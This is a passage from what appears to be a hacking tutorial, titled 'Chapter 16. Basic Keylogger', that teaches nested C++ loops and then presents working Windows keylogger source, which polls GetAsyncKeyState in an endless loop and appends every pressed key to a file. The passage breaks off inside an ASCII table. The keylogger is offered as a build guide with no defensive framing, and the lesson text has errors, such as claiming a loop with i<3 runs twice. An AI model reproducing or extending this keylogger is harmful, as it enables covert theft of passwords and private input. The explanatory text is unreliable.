- md: "\n## Chapter 16. Basic Keylogger\n\nThe first things we are going to need for\
    \ the Keylogger are the #include <windows.h> and #include <Winuser.h> header files\
    \ because we are going to be needing some functions for which these are the requirement.\n\
    \nBuilding loops within loops (nested loops) is important, as the Keylogger will\
    \ have lots and lots of this within it. The program below shows how a loop is\
    \ built within another loop and made to run infinitely.\n\n```cpp\n#include <Winuser.h>\n\
    \nusing namespace std;\n\nint main() {\n    char c;\n    for (int i=0; i<3; i++)\
    \ {\n        for (int j=0; j<3; j++) {\n            cout << \"I am SECOND: \"\
    \ << j << endl;\n        }\n        cout << \"I am FIRST: \" << i << endl;\n \
    \   }\n}\n```\n\nOn line 11, a variable of type char is created and loop on Line\
    \ 13, the first loop (for loop) begins. Within the parenthesis of this loop, conditions\
    \ are set to govern the operation of the program block. A variable i of type int\
    \ is created and initialized to 0. The loop is set to continue running as long\
    \ as i is less than 3; i.e i will run two times. The i++ counts and records the\
    \ number of cycles the program has completed and stops once it satisfies the condition\
    \ of i < 3. The beginning and end or start and finish of this loop is defined\
    \ by the braces which spans from Line 14 to Line 21.\n\n**Note:** Curly braces\
    \ are used to mark the beginning and end of functions.\n\nIn other words, the\
    \ for loop on line 13 will begin and once it begins, it will start evaluating\
    \ the conditions laid out within it. If it evaluates to true, i.e. if i is less\
    \ than 3, it will run whatever codes are within the curly brackets of the for\
    \ loop.\n\n```cpp\nfor( int i=0; i<3 ; i++) {\n    for( int j=0; j<3; j++) {\n\
    \        cout << \"I am SECOND :\" << j << endl;\n    }\n    cout << \"I am FIRST\
    \ :\" << i << endl;\n}\n```\n\nWithin Line 15 and 18, we have another for loop\
    \ nested under the first. The program evaluates the codes on Line 15 and as long\
    \ as it evaluates to true, it will keep on printing the statement on Line 17 until\
    \ it becomes false - when j becomes greater or equal to 3 - it will stop, exit\
    \ the second loop and enter the first loop again then it will print out the statement\
    \ on Line 20 again. If the first condition evaluates to be true again, the second\
    \ loop will run again and so on 3 times (0 - 2 = 0, 1, 2 times). Study the program\
    \ below taking cognizance of it’s output.\n\n```cpp\n#include <iostream>\n#include\
    \ <windows.h>\n#include <Winuser.h>\n4\n5 using namespace std;\n6\n7\n8 int main()\n\
    9 {\n10\n11 char c;\n12\n13 for (int i=0; i<3; i++)\n14 {\n15 for (int j=0; j<3;\
    \ j++)\n16 {\n17 cout << \"AM SECOND: \" << j << endl;\n18 }\n19\n20 cout << \"\
    AM FIRST: \" << i << endl;\n21 }\n```\n\n![](img/eb3517bc8b212720f2254aa5b46526b4_109_0.png)\n\
    \nNow that you have an understanding of how nested structures work, let’s get\
    \ right into its application on the Keylogger.\n\n```cpp\n#include <iostream>\n\
    #include <windows.h>\n#include <Winuser.h>\n\nusing namespace std;\n\nint main()\
    \ {\n    char c;\n    for(;;) {\n        for(c=8; c<=222; c++) {\n           \
    \ if(GetAsyncKeyState(c) == -32767) {\n                ofstream write(\"Record.txt\"\
    , ios::app);\n                write << c;\n            }\n        }\n    }\n}\n\
    ```\n\nFrom the figure directly above, Line 12 contains a for loop. The semi-colons\
    \ within its parenthesis specifies that the loop is an infinite one i.e. it is\
    \ set to run continuously without ceasing. On Line 14 lies a nested loop whose\
    \ conditions specify the range of characters the program will be able to read.\
    \ This range of character is obtained from the ASCII codes. It is not necessary\
    \ to carry the ASCII table in your head, reference can simply be made to it from\
    \ the internet. Below is an example of an ASCII code table:\n\n## Characters\n\
    \n| | | | | | | | | | | |\n|---|---|---|---|---|---|---|---|---|---|---|\n| 00\
    \ | NULL (Null character) | 32 | 64 | @ | 96 | 128 | 160 | 192 | 224 |\n| 01 |\
    \ SOH (Start of Header) | 33 | 65 | A | 97 | 129 | 161 | 193 | 225 |\n| 02 | STX\
    \ (Start of Text) | 34 | 66 | B | 98 | 130 | 162 | 194 | 226 |\n| 03 | ETX (End\
    \ of Text) | 35 | 67 | C | 99 | 131 | 163 | 195 | 227 |\n| 04 | EOT (End of Trans.)\
    \ | 36 | 68 | D | 100 | 132 | 164 | 196 | 228 |\n| 05 | ESC (Escape) | 37 | 69\
